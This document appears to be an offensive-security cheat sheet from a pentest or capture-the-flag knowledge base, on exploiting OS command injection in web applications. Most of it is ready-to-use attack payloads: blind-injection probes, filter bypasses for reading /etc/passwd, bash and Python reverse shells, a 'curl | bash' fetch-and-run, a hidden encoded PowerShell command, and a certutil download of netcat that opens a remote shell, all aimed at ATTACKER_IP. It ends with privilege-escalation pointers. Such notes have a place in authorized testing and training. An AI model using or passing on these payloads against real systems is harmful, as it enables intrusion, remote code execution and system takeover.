---
id: command-injection
title: Command Injection
stage: initial-access
tags: [web, linux, windows]
summary: Inject OS commands into a web application that passes user input to a shell — distinct from SQLi and SSTI, with its own bypass patterns for spaces, special characters, and WAFs.
leads_to:
  - rev-shell
  - web-shell
---

## Prerequisites

A web input that gets passed to a shell function — ping utilities, DNS resolvers, file converters, nmap wrappers, image processors. Look for parameters named `host`, `ip`, `cmd`, `exec`, `ping`, `domain`, `url`. Confirm injection with a time-based payload before attempting RCE.

Command injection is possible wherever an application constructs a shell command using user input without sanitisation. The application runs the command as its own user (often `www-data`), giving you immediate code execution. Always confirm blind injection via timing before trying OOB techniques.

## Quick Win

> Time-based detection — 5 second delay confirms blind injection with zero noise.

```bash
# Append with semicolon
; sleep 5
# Pipe
| sleep 5
# Background
& sleep 5
# Backtick / subshell
`sleep 5`
$(sleep 5)
# Newline (URL-encoded %0a)
%0a sleep 5
```

## Confirm Blind Injection (OOB)

> Ping your tun0 and listen with tcpdump — ICMP response confirms execution.

```bash
# Start listener
tcpdump -i tun0 icmp

# Payload
; ping -c 1 ATTACKER_IP
```

## Common Bypass Techniques

> Try these when basic separators are filtered.

```bash
# Space bypass
${IFS}          # replaces space in bash
{IFS}
$IFS$9
cat${IFS}/etc/passwd

# Wildcard
/???/??t /etc/passwd   # /bin/cat /etc/passwd

# Encoding — URL-encode payloads for GET parameters
; → %3B
| → %7C
& → %26

# Case bypass (Windows)
wHoAmI
```

## Linux Payloads

> Inject a reverse shell — URL-encode the full payload for GET parameters.

```bash
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
; curl ATTACKER_IP/shell.sh | bash
```

## Windows Payloads

```powershell
& powershell -nop -w hidden -enc BASE64_PAYLOAD
& certutil -urlcache -f http://ATTACKER_IP/nc.exe C:\Windows\Temp\nc.exe && C:\Windows\Temp\nc.exe -e cmd.exe ATTACKER_IP PORT
```

## Leads To

Shell confirmed → immediately upgrade to a full reverse shell via the rev-shell techniques — a web shell is semi-interactive and drops on connection reset. On Linux: check `id` first — `www-data` means SUID/sudo checks next. On Windows: `whoami /priv` → SeImpersonatePrivilege → GodPotato.
